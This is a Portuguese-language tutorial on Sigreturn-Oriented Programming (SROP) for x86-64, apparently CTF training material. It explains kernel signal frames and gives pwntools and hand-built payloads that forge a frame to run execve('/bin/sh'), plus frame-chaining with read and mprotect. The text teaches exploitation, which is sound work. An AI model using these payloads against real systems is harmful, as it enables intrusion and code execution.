SIGROP (Sigreturn-Oriented Programming)

SIGROP (ou SROP) usa a syscall sigreturn para carregar todos os registradores de uma vez a partir de dados na stack. Em vez de um gadget para cada registrador, bastam dois ingredientes:

  • um gadget syscall (de preferência syscall; ret);
  • um jeito de colocar 15 em rax.

É a técnica padrão para binários estáticos minúsculos, escritos em assembly, em que quase não há gadgets.

Como sinais funcionam​

Quando um processo recebe um sinal que tem handler registrado, o kernel:

  1. Interrompe o processo e salva todos os registradores na stack do próprio processo, em uma estrutura chamada signal frame.
  2. Desvia a execução para o handler.
  3. Quando o handler retorna, cai em um trampolim que executa a syscall rt_sigreturn (número 15 em x86-64, 173 em x86).
  4. O kernel lê o frame da stack e restaura todos os registradores, incluindo rip e rsp. O programa continua de onde parou.

O kernel não guarda nenhuma cópia do frame e não tem como verificar se ele é legítimo. Se chamarmos sigreturn com rsp apontando para um frame forjado, o kernel carrega os nossos valores em todos os registradores.

O ataque​

Depois do sigreturn, o processador está com rax = 59, rdi = &"/bin/sh", rsi = rdx = 0 e rip em um syscall: executa execve("/bin/sh", 0, 0).

Com pwntools​

from pwn import *

context.arch = 'amd64'

SYSCALL = 0x400100     # syscall; ret
POP_RAX = 0x4000f0     # pop rax; ret
BINSH   = 0x601000     # endereço de uma string "/bin/sh"

frame = SigreturnFrame()         # 248 bytes em amd64; cs = 0x33 já vem preenchido
frame.rax = 59                   # execve
frame.rdi = BINSH
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL

payload  = b'A' * offset
payload += p64(POP_RAX) + p64(15)
payload += p64(SYSCALL)
payload += bytes(frame)          # imediatamente depois do endereço do gadget syscall

Registradores não definidos ficam em zero. O objeto ROP também pode fazer isso sozinho: ao pedir uma syscall como rop.execve(BINSH, 0, 0), ele recorre a SROP quando faltam gadgets para os registradores.

Onde o frame começa​

No fluxo legítimo, o frame começa com um campo pretcode (o endereço do trampolim), que o ret do handler desempilha antes do sigreturn. Por isso o kernel assume que, no momento da syscall, rsp já está 8 bytes depois do início do frame, em uc_flags.

No ataque, o endereço do gadget syscall faz o papel do pretcode: ele é desempilhado pelo ret anterior. O SigreturnFrame do pwntools já começa em uc_flags. Portanto, o frame vem colado logo depois do endereço do gadget syscall, sem nada no meio.

Sem pop rax​

Binários minúsculos raramente têm pop rax; ret. As alternativas vêm do fato de que rax guarda o valor de retorno da última função ou syscall:

  • read retorna a quantidade de bytes lidos. Se a chain volta para um read do programa e você envia exatamente 15 bytes, rax = 15 na saída. É por isso que tantos exploits de SROP têm um p.send(b'A' * 15).
  • write, strlen, atoi, alarm (retorna os segundos restantes do alarme anterior) também devolvem valores controláveis.

Encadeando frames​

Um frame só chama uma syscall. Para continuar depois dela:

  • frame.rip aponta para um gadget syscall; ret (não um syscall solto);
  • frame.rsp aponta para uma região que controlamos, onde está a continuação da chain.

Depois da syscall, o ret consome o próximo endereço a partir do novo rsp. O padrão clássico em binários sem /bin/sh:

  1. Frame 1: read(0, bss, 0x400), com rsp = bss + 8. Isso é ao mesmo tempo um stack pivot para a .bss.
  2. Enviamos /bin/sh\0 seguido da segunda chain, que cai exatamente onde o novo rsp aponta.
  3. Frame 2: execve(bss, 0, 0).

Outro uso comum: mprotect(pagina, 0x1000, 7) para tornar uma região executável e seguir com shellcode.

Para um execve final, rsp e rbp podem ser zero: o processo é substituído antes de usar a stack.

Montando o frame à mão​

Útil para entender o layout ou quando não se pode usar o pwntools. São 31 campos de 8 bytes (248 bytes), na ordem em que o pwntools os monta:

frame = flat(
    0, 0, 0, 0, 0,              # uc_flags, uc_link, uc_stack (ss_sp, ss_flags, ss_size)
    0, 0, 0, 0, 0, 0, 0, 0,     # r8 a r15
    BINSH,                      # rdi
    0,                          # rsi
    0,                          # rbp
    0,                          # rbx
    0,                          # rdx
    59,                         # rax
    0,                          # rcx
    0,                          # rsp
    SYSCALL,                    # rip
    0,                          # eflags
    0x33,                       # cs (2 bytes), gs, fs, ss
    0, 0, 0, 0,                 # err, trapno, oldmask, cr2
    0,                          # fpstate
    0,                          # reservado
    0,                          # sigmask
)
assert len(frame) == 248

Na struct real do kernel, o campo reservado tem 8 posições e a máscara de sinais vem depois delas, em frame + 0x128. O frame de 248 bytes é uma versão truncada: o kernel lê o resto do que vier em seguida na stack. Isso só importaria se a máscara de sinais fizesse diferença para o exploit, o que na prática não acontece.
